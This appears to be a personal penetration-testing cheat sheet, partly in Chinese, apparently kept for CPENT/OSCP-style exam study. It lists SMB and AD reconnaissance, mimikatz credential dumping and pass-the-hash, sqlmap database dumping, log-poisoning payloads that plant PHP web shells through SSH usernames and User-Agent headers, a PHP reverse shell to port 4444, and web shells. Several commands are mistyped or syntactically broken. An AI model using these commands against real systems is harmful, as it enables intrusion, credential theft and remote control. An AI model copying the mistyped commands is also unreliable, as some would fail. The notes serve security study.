Markdown語法：https://hackmd.io/@eMP9zQQ0Qt6I8Uqp2Vqy6w/SyiOheL5N/%2FBVqowKshRH246Q7UDyodFA  
  
https://blog.stevenyu.tw/2022/06/10/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-cpent-%E8%80%83%E8%A9%A6%E5%BF%83%E5%BE%97%E3%80%81%E4%BB%A5%E5%8F%8A%E8%88%87-oscp-%E7%9A%84%E6%AF%94%E8%BC%83/  
## NMAP Reacon ##  
nmap -sS -n -p 445 --script smb-protocls 192.168.1.1   

## AD Reacon ##  
# Commands on Windows #  
nbtstat -A (IP)  
adreacon.ps1  
# Commands on Linux #  
enum4linux-ng -A  

## Reacon SMB ##  
net view \\192.168.1.1  
dir \\192.168.1.1  
smbclient -L //IP -U DC_name\\acount  
nmap -n -sS -p137,138,139,448 --script smb-os-discovery 192.168.1.1  
nmap -sS -n -p 445 --script smb-protocls 192.168.1.1  

## Use SMB ##  
smbclient -L //IP -U DC_name\\acount  
smbclient //IP/<Folder> -U DC_name\\account  
smbclient //192.168.1.1/C$ -U DC_name\\account  

## Download File ##  
certutil -urlcache -split -f <URL> <輸出檔名>  

## Windows Remote ##  
# WinRM #  
evil-winrm  
# RDP #  
```xfreerdp3```  
# psexec #  
``impacket-psexec```  
psexec \\192.168.1.1: cmd.exe  
# smbexec #  
```impacket-smbexec```  

# mimikatz #  
privilege::debug  
tocke::elevate  
lsadump::sam  
sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>  

## GDB ##  
# Install PEDA Plgu-in #  
# Commands #  
gdb XXXX(binary name)  
b main  
run  
info registers  
disassemble main  
p system  
search /bin/sh  

## Privilege Escalation ##  
# Overlay #  
https://github.com/briskets/CVE-2021-3493  


## Firmware Analyze ## 
# binwalk  
binwalk -e --signature --term (Filename)  
# binwalk3  
binwalk3  
# firmware analysis toolkit(fat) ## 
sudo ./fat3.py (filename)  
# AttifyOS Emulation ##  

## Hash Cracker ##  
# John ##  
john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>  
# Hashcat ##  

## Web Recon ##  
# Nikto #    
# wpscan #  
```wpscan --update ```  
```wpscan --enumate```  
```wpscan -e u,p ```  

# Whatweb #  
``` whatweb 192.168.1.1  ```   
``` whatweb -v 192.168.1.1 ```   
``` whatweb --log-verbose=log.txt 192.168.1.1 ```   


## SQLi ##  
# 手動確認漏洞存在 #  
單引號'  
變數及單引號 abc'  
數字1  
數字0  
# sqlmap #  
```sqlmap -u "www.example.com" --cooikes=<cookies>  --dump  ```   
```sqlmap -r <request.filename> --dump  ```  
```sqlmap -r <request.filename> --dump  --level 2```  
```sqlmap -u "www.example.com" --cooikes=<cookies>  --dbs  ```  
```sqlmap -u "www.example.com" --cooikes=<cookies>  -D [Database name] --tables  ```  

```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  

```sqlmap -u "www.example.com" --method POST --data "[Copied POST Request]" -p '[vuln field name]' --dbs ```  
```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  

## Log Poison ##  
# SSH Log (/var/log/auth.log) #  
```ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```
``` ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```  
# Apache Log (/var/log/apache2/access.log)  
``` User-Agent: <?php system($_GET['cmd']); ?>  ```

## Reverse Shell ##  
# php #  
``` php -r '$sock=fsockopen("192.168.1.1",4444);$proc=proc_open("/bin/sh -i", array(0>=$sock, 1=>$sock, 2=>sock),$pipes);' ```  
``` <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?> ```  
``` <?php system($_GET['cmd]); ?> ```  


## TTY ##  
``` python3 -c 'import pty; pty.spawn("/bin/sh")' ```  

## Wordpress ##  
http://192.168.1.1/wp-content/themes/twentyfifteen/404.php  

## Open Source Target ##  
# http://testphp.vulnweb.com/ #  


